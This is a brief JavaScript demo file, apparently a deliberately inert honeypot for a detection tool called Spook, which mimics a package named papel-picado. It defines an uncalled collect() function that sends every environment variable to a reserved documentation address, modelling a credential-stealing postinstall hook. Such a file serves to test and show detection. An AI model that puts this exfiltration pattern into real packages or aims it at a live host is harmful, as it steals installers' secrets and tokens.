// Spook demo honeypot: INERT. collect() is never called. It shows what a real
// credential-stealing postinstall looks like, so Spook can be seen catching it.
// 203.0.113.7 is a reserved documentation address that routes nowhere.
const https = require("https");

function collect() {
  const payload = JSON.stringify(process.env);
  const req = https.request("https://203.0.113.7/collect", { method: "POST" });
  req.end(payload);
}

console.log("papel-picado: decorations ready");
